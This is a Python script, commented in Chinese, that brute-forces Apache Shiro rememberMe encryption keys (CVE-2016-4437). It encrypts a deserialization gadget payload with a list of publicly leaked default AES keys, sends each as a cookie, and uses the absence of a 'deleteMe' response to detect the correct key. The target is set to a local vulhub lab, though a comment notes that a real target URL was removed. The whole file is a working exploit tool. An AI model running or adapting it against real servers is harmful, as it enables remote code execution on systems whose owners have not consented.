# Shiro key 爆破：同一发 CB1 弹，轮换已知泄露 key；deleteMe 消失 = 钥匙命中
import base64, os, time, urllib.request
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# 目标改成你自己的靶机地址再跑（原真实靶机 URL 已于 2026-09-08 清理，避免外部目标长期留存）
TARGET = "http://127.0.0.1:8100/web/"   # vulhub Shiro CVE-2016-4437 本地靶
KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==", "4AvVhmFLUs0KTA3Kprsdag==", "Z3VucwAAAAAAAAAAAAAAAA==",
    "fCq+/xW488hMTCD+cmJ3aQ==", "0AvVhmFLUs0KTA3Kprsdag==", "1QWLxg+NYmxraMoxAXu/Iw==",
    "25uoMm8eJD4VFvf3lxYvCA==", "r0eMcwcHNVTL4AcsTmbkFA==", "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==", "wGiHplamyXlVB11XRWfaICQ==", "5AvVhmFLUs0KTA3Kprsdag==",
    "1AvVhdsgUs0FSA3SDFAdag==", "ZUYepq03VRQExud6dFF0yA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==",
    "2AvVhdsgUs0FSA3SDFAdag==", "LEGEND-CAMPFFFFFFFFFFFFF==", "RCG2azM6/YBTgVwVCCtYCA==",
    "L7RxUboRhaN+YAwQzNRTAA==", "kvjRPrEJvZmA9PB0jG0yJg==", "6Zm+6I2j5Y+R5aS+5ZOlAA==",
    "Is9CWEVsTnFhN0FUI1iLog==", "a2VlcE9uR29pbmdBbmRGaQ==", "bWluZS1pcy1rZXk6QQ==",
    "5aaC5qKm5oGL5pel6aqAAAEAABAAAAEAAB", "4BvVhmFLUs0KTA3Kprsdag==",
    "MI/+UYtScDJBdDqYrHvY1g==", "cKZ1MhwP+OoAjgnuBJQXpg==", "Zm9yU2VjdXJpdHlQcm9qZWN0",
    "MTIzNDU2Nzg5MGFiY2RlZg==",
]
payload = open('cb1_sleep.ser', 'rb').read()

for k in KEYS:
    try:
        key = base64.b64decode(k)
        if len(key) not in (16, 24, 32):
            continue
        iv = os.urandom(16)
        ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))
        cookie = base64.b64encode(iv + ct).decode()
        req = urllib.request.Request(TARGET, headers={"Cookie": "rememberMe=" + cookie})
        t0 = time.time()
        resp = urllib.request.urlopen(req, timeout=20)
        dt = time.time() - t0
        dm = "rememberMe=deleteMe" in resp.headers.get_all("Set-Cookie", []) or \
             any("deleteMe" in (h or "") for h in resp.headers.get_all("Set-Cookie", []))
        mark = "  <== 命中！deleteMe 消失" if not dm else ""
        print(f"{k[:24]:26s} {dt:5.2f}s deleteMe={dm}{mark}", flush=True)
        if not dm:
            open('found_key.txt', 'w').write(k)
            print("\n*** KEY = " + k + " ***", flush=True)
            break
    except Exception as e:
        print(f"{k[:24]:26s} ERR {type(e).__name__}", flush=True)
